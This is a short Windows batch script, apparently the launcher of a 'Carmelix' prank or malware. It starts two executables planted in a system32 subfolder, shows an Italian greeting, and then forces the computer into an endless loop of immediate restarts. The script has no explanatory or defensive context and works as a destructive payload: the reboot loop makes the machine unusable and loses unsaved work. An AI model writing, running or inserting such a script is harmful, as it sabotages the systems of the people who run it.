cd "%systemroot%\system32\CARMELIX"
start Sono.exe
timeout 20 >nul /nobreak
start Bene.exe
timeout 1 >nul /nobreak
shutdown /r /f /c "Ciao, sono Carmelix, AMICO MIO" /t 2
:begin
shutdown /r /t 0 /f
goto begin
